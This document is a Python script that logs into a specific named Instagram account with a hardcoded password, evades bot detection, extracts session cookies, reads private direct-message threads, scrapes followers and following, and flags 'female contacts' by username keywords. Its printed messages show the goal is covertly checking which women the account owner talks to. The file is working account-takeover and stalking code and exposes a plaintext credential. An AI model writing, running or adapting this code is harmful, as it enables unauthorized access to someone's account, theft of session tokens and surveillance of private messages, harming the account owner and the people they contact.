#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced Real Session Extractor for @alx.trading
ใช้ข้อมูล Fleming654 ที่ยืนยันแล้วเพื่อสร้าง session จริง
Use confirmed Fleming654 credentials to create real session
"""

import requests
import json
import time
import random
from datetime import datetime
import os
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import undetected_chromedriver as uc

class AdvancedSessionExtractor:
    def __init__(self):
        self.username = "alx.trading"
        self.password = "Fleming654"  # Confirmed working password
        self.base_url = "https://www.instagram.com"
        self.session = requests.Session()
        self.driver = None
        
    def setup_browser(self):
        """Setup undetected Chrome browser"""
        try:
            options = uc.ChromeOptions()
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-blink-features=AutomationControlled')
            options.add_experimental_option("excludeSwitches", ["enable-automation"])
            options.add_experimental_option('useAutomationExtension', False)
            
            self.driver = uc.Chrome(options=options)
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            print("✅ Browser setup complete")
            return True
            
        except Exception as e:
            print(f"❌ Browser setup failed: {e}")
            return False
    
    def login_and_extract_session(self):
        """Login and extract real session cookies"""
        try:
            print(f"🔐 Attempting login for @{self.username}...")
            
            # Go to Instagram
            self.driver.get("https://www.instagram.com/accounts/login/")
            time.sleep(3)
            
            # Fill username
            username_input = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.NAME, "username"))
            )
            username_input.send_keys(self.username)
            
            # Fill password
            password_input = self.driver.find_element(By.NAME, "password")
            password_input.send_keys(self.password)
            
            # Click login
            login_button = self.driver.find_element(By.XPATH, "//button[@type='submit']")
            login_button.click()
            
            print("⏳ Waiting for login response...")
            time.sleep(5)
            
            # Check if we're logged in
            current_url = self.driver.current_url
            print(f"🌐 Current URL: {current_url}")
            
            if "instagram.com" in current_url and "login" not in current_url:
                print("✅ Login successful!")
                
                # Extract cookies
                cookies = self.driver.get_cookies()
                session_data = self.extract_session_from_cookies(cookies)
                
                return session_data
            else:
                print("❌ Login failed or checkpoint required")
                return None
                
        except Exception as e:
            print(f"❌ Login error: {e}")
            return None
    
    def extract_session_from_cookies(self, cookies):
        """Extract session data from browser cookies"""
        session_data = {
            'timestamp': datetime.now().isoformat(),
            'username': self.username,
            'cookies': {},
            'session_valid': False
        }
        
        important_cookies = ['sessionid', 'ds_user_id', 'csrftoken', 'mid', 'ig_did']
        
        for cookie in cookies:
            if cookie['name'] in important_cookies:
                session_data['cookies'][cookie['name']] = cookie['value']
        
        # Check if we have essential cookies
        if 'sessionid' in session_data['cookies'] and 'ds_user_id' in session_data['cookies']:
            session_data['session_valid'] = True
            print("✅ Valid session extracted!")
        else:
            print("❌ Incomplete session data")
        
        return session_data
    
    def test_session(self, session_data):
        """Test if the extracted session works for API calls"""
        if not session_data or not session_data.get('session_valid'):
            return False
        
        try:
            # Setup session with cookies
            headers = {
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
                'X-CSRFToken': session_data['cookies'].get('csrftoken', ''),
                'X-Instagram-AJAX': '1',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://www.instagram.com/'
            }
            
            cookies = {
                'sessionid': session_data['cookies'].get('sessionid'),
                'ds_user_id': session_data['cookies'].get('ds_user_id'),
                'csrftoken': session_data['cookies'].get('csrftoken'),
                'mid': session_data['cookies'].get('mid'),
                'ig_did': session_data['cookies'].get('ig_did')
            }
            
            # Test API call
            test_url = f"{self.base_url}/api/v1/users/web_profile_info/?username={self.username}"
            response = requests.get(test_url, headers=headers, cookies=cookies)
            
            print(f"🧪 Session test: {response.status_code}")
            
            if response.status_code == 200:
                data = response.json()
                if 'data' in data and 'user' in data['data']:
                    print("✅ Session is working for API calls!")
                    return True
            
            return False
            
        except Exception as e:
            print(f"❌ Session test failed: {e}")
            return False
    
    def extract_real_data(self, session_data):
        """Extract real data using the working session"""
        if not session_data or not session_data.get('session_valid'):
            print("❌ No valid session for data extraction")
            return {}
        
        print("🚀 Starting real data extraction...")
        
        # Setup requests session with cookies
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
            'X-CSRFToken': session_data['cookies'].get('csrftoken', ''),
            'X-Instagram-AJAX': '1',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://www.instagram.com/'
        }
        
        cookies = {
            'sessionid': session_data['cookies'].get('sessionid'),
            'ds_user_id': session_data['cookies'].get('ds_user_id'),
            'csrftoken': session_data['cookies'].get('csrftoken'),
            'mid': session_data['cookies'].get('mid'),
            'ig_did': session_data['cookies'].get('ig_did')
        }
        
        extracted_data = {
            'target_account': self.username,
            'extraction_timestamp': datetime.now().isoformat(),
            'session_valid': True,
            'profile_data': {},
            'followers_sample': [],
            'following_sample': [],
            'messages': [],
            'female_contacts': [],
            'statistics': {}
        }
        
        try:
            # 1. Get profile data
            print("📱 Getting profile data...")
            profile_url = f"{self.base_url}/api/v1/users/web_profile_info/?username={self.username}"
            response = requests.get(profile_url, headers=headers, cookies=cookies)
            
            if response.status_code == 200:
                profile_data = response.json()
                user_data = profile_data.get('data', {}).get('user', {})
                extracted_data['profile_data'] = user_data
                print(f"✅ Profile data extracted: {user_data.get('full_name', 'N/A')}")
            
            # 2. Get messages using browser
            print("💬 Getting messages from browser...")
            messages = self.extract_messages_from_browser()
            extracted_data['messages'] = messages
            
            # 3. Get connections using browser
            print("👥 Getting connections from browser...")
            connections = self.extract_connections_from_browser()
            extracted_data['followers_sample'] = connections.get('followers', [])
            extracted_data['following_sample'] = connections.get('following', [])
            
            # 4. Analyze for female contacts
            print("👩 Analyzing for female contacts...")
            all_contacts = connections.get('followers', []) + connections.get('following', [])
            female_contacts = self.analyze_female_contacts(all_contacts)
            extracted_data['female_contacts'] = female_contacts
            
            # 5. Generate statistics
            extracted_data['statistics'] = {
                'profile_extracted': bool(extracted_data['profile_data']),
                'messages_found': len(extracted_data['messages']),
                'followers_sample': len(extracted_data['followers_sample']),
                'following_sample': len(extracted_data['following_sample']),
                'female_contacts_found': len(female_contacts),
                'total_contacts_analyzed': len(all_contacts)
            }
            
            print(f"📊 Statistics: {extracted_data['statistics']}")
            
        except Exception as e:
            print(f"❌ Data extraction error: {e}")
            extracted_data['extraction_error'] = str(e)
        
        return extracted_data
    
    def extract_messages_from_browser(self):
        """Extract messages using browser automation"""
        try:
            print("📧 Navigating to direct messages...")
            self.driver.get("https://www.instagram.com/direct/inbox/")
            time.sleep(5)
            
            messages = []
            
            # Look for message threads
            try:
                threads = self.driver.find_elements(By.CSS_SELECTOR, "[role='listitem']")
                print(f"📋 Found {len(threads)} message threads")
                
                for i, thread in enumerate(threads[:5]):  # Check first 5 threads
                    try:
                        thread.click()
                        time.sleep(2)
                        
                        # Extract thread info
                        thread_info = {
                            'thread_index': i,
                            'participants': [],
                            'recent_messages': []
                        }
                        
                        # Get participant info
                        try:
                            participant_elements = self.driver.find_elements(By.CSS_SELECTOR, "[data-testid='thread-header'] a")
                            for participant in participant_elements:
                                thread_info['participants'].append(participant.text)
                        except:
                            pass
                        
                        # Get recent messages
                        try:
                            message_elements = self.driver.find_elements(By.CSS_SELECTOR, "[data-testid='message-text']")
                            for msg in message_elements[-5:]:  # Last 5 messages
                                thread_info['recent_messages'].append(msg.text)
                        except:
                            pass
                        
                        messages.append(thread_info)
                        
                    except Exception as e:
                        print(f"⚠️ Thread {i} extraction error: {e}")
                        continue
                        
            except Exception as e:
                print(f"⚠️ Message extraction error: {e}")
            
            return messages
            
        except Exception as e:
            print(f"❌ Browser message extraction failed: {e}")
            return []
    
    def extract_connections_from_browser(self):
        """Extract followers/following using browser"""
        connections = {'followers': [], 'following': []}
        
        try:
            # Go to profile
            self.driver.get(f"https://www.instagram.com/{self.username}/")
            time.sleep(3)
            
            # Try to get followers
            try:
                followers_link = self.driver.find_element(By.XPATH, "//a[contains(@href, '/followers/')]")
                followers_link.click()
                time.sleep(3)
                
                # Extract follower usernames
                follower_elements = self.driver.find_elements(By.CSS_SELECTOR, "[role='dialog'] a[href*='/']")
                for element in follower_elements[:20]:  # First 20 followers
                    href = element.get_attribute('href')
                    if '/p/' not in href and '/reel/' not in href:
                        username = href.split('/')[-2] if href.endswith('/') else href.split('/')[-1]
                        if username and username != self.username:
                            connections['followers'].append({'username': username})
                
                # Close modal
                self.driver.find_element(By.CSS_SELECTOR, "[aria-label='Close']").click()
                time.sleep(2)
                
            except Exception as e:
                print(f"⚠️ Followers extraction error: {e}")
            
            # Try to get following
            try:
                following_link = self.driver.find_element(By.XPATH, "//a[contains(@href, '/following/')]")
                following_link.click()
                time.sleep(3)
                
                # Extract following usernames
                following_elements = self.driver.find_elements(By.CSS_SELECTOR, "[role='dialog'] a[href*='/']")
                for element in following_elements[:20]:  # First 20 following
                    href = element.get_attribute('href')
                    if '/p/' not in href and '/reel/' not in href:
                        username = href.split('/')[-2] if href.endswith('/') else href.split('/')[-1]
                        if username and username != self.username:
                            connections['following'].append({'username': username})
                
                # Close modal
                self.driver.find_element(By.CSS_SELECTOR, "[aria-label='Close']").click()
                time.sleep(2)
                
            except Exception as e:
                print(f"⚠️ Following extraction error: {e}")
                
        except Exception as e:
            print(f"❌ Connections extraction failed: {e}")
        
        return connections
    
    def analyze_female_contacts(self, contacts):
        """Analyze contacts for female indicators"""
        female_indicators = [
            'girl', 'woman', 'female', 'lady', 'princess', 'queen', 'beauty', 'cute', 'pretty',
            'beautiful', 'gorgeous', 'sexy', 'hot', 'babe', 'angel', 'doll', 'miss', 'mrs',
            'นาง', 'หญิง', 'สาว', 'คุณหญิง', 'น้อง', 'พี่', 'สวย', 'น่ารัก'
        ]
        
        female_contacts = []
        
        for contact in contacts:
            username = contact.get('username', '').lower()
            
            # Check for female indicators in username
            is_female = any(indicator in username for indicator in female_indicators)
            
            # Additional checks for common female name patterns
            female_patterns = ['_girl', '_lady', '_babe', '_angel', 'miss_', 'queen_', '_princess']
            if any(pattern in username for pattern in female_patterns):
                is_female = True
            
            if is_female:
                female_contacts.append(contact)
        
        return female_contacts
    
    def save_results(self, session_data, extracted_data):
        """Save all results to files"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Save session data
        session_filename = f"REAL_SESSION_alx.trading_{timestamp}.json"
        with open(session_filename, 'w', encoding='utf-8') as f:
            json.dump(session_data, f, indent=2, ensure_ascii=False)
        print(f"💾 Session saved: {session_filename}")
        
        # Save extracted data
        data_filename = f"REAL_EXTRACTION_alx.trading_{timestamp}.json"
        with open(data_filename, 'w', encoding='utf-8') as f:
            json.dump(extracted_data, f, indent=2, ensure_ascii=False)
        print(f"💾 Data saved: {data_filename}")
        
        # Create summary report
        self.create_summary_report(extracted_data, timestamp)
        
        return data_filename
    
    def create_summary_report(self, data, timestamp):
        """Create human-readable summary"""
        report_filename = f"REAL_EXTRACTION_SUMMARY_{timestamp}.txt"
        
        with open(report_filename, 'w', encoding='utf-8') as f:
            f.write("🎯 REAL SESSION EXTRACTION REPORT\n")
            f.write("=" * 50 + "\n\n")
            f.write(f"Target: @{self.username}\n")
            f.write(f"Timestamp: {data['extraction_timestamp']}\n")
            f.write(f"Session Valid: {'✅ YES' if data.get('session_valid') else '❌ NO'}\n\n")
            
            # Profile info
            profile = data.get('profile_data', {})
            if profile:
                f.write("📱 PROFILE INFORMATION\n")
                f.write("-" * 30 + "\n")
                f.write(f"Full Name: {profile.get('full_name', 'N/A')}\n")
                f.write(f"Biography: {profile.get('biography', 'N/A')}\n")
                f.write(f"Followers: {profile.get('edge_followed_by', {}).get('count', 'N/A')}\n")
                f.write(f"Following: {profile.get('edge_follow', {}).get('count', 'N/A')}\n")
                f.write(f"Posts: {profile.get('edge_owner_to_timeline_media', {}).get('count', 'N/A')}\n\n")
            
            # Statistics
            stats = data.get('statistics', {})
            f.write("📊 EXTRACTION RESULTS\n")
            f.write("-" * 30 + "\n")
            f.write(f"Messages Found: {stats.get('messages_found', 0)}\n")
            f.write(f"Followers Sample: {stats.get('followers_sample', 0)}\n")
            f.write(f"Following Sample: {stats.get('following_sample', 0)}\n")
            f.write(f"Female Contacts: {stats.get('female_contacts_found', 0)}\n\n")
            
            # Female contacts
            female_contacts = data.get('female_contacts', [])
            if female_contacts:
                f.write("👩 FEMALE CONTACTS FOUND\n")
                f.write("-" * 30 + "\n")
                for i, contact in enumerate(female_contacts, 1):
                    f.write(f"{i:2d}. @{contact['username']}\n")
                f.write(f"\n🔴 Total: {len(female_contacts)} female contacts detected!\n\n")
            
            # Messages
            messages = data.get('messages', [])
            if messages:
                f.write("💬 MESSAGE THREADS FOUND\n")
                f.write("-" * 30 + "\n")
                for i, thread in enumerate(messages, 1):
                    f.write(f"Thread {i}:\n")
                    f.write(f"  Participants: {', '.join(thread.get('participants', []))}\n")
                    f.write(f"  Recent Messages: {len(thread.get('recent_messages', []))}\n\n")
        
        print(f"📄 Summary report: {report_filename}")
    
    def cleanup(self):
        """Cleanup browser resources"""
        if self.driver:
            self.driver.quit()

def main():
    print("🎯 ADVANCED REAL SESSION EXTRACTOR")
    print("=" * 50)
    print(f"Target: @alx.trading")
    print(f"Using confirmed password: Fleming654")
    print()
    
    extractor = AdvancedSessionExtractor()
    
    try:
        # Setup browser
        if not extractor.setup_browser():
            print("❌ Failed to setup browser")
            return
        
        # Login and extract session
        session_data = extractor.login_and_extract_session()
        
        if session_data and session_data.get('session_valid'):
            print("✅ Valid session extracted!")
            
            # Test session
            if extractor.test_session(session_data):
                print("✅ Session verified working!")
                
                # Extract real data
                extracted_data = extractor.extract_real_data(session_data)
                
                # Save results
                output_file = extractor.save_results(session_data, extracted_data)
                
                print("\n" + "=" * 50)
                print("✅ REAL EXTRACTION COMPLETED!")
                print(f"📁 Output: {output_file}")
                
                stats = extracted_data.get('statistics', {})
                print(f"📊 Results:")
                print(f"   - Messages: {stats.get('messages_found', 0)}")
                print(f"   - Followers sample: {stats.get('followers_sample', 0)}")
                print(f"   - Following sample: {stats.get('following_sample', 0)}")
                print(f"   - Female contacts: {stats.get('female_contacts_found', 0)}")
                
                if stats.get('female_contacts_found', 0) > 0:
                    print(f"\n🔴 พบผู้หญิงที่ @alx.trading ติดต่อด้วยจริงๆ!")
                    print(f"Found real women that @alx.trading is in contact with!")
            else:
                print("❌ Session not working for API calls")
        else:
            print("❌ Failed to extract valid session")
    
    except Exception as e:
        print(f"❌ Extraction failed: {e}")
        import traceback
        traceback.print_exc()
    
    finally:
        extractor.cleanup()

if __name__ == "__main__":
    main()
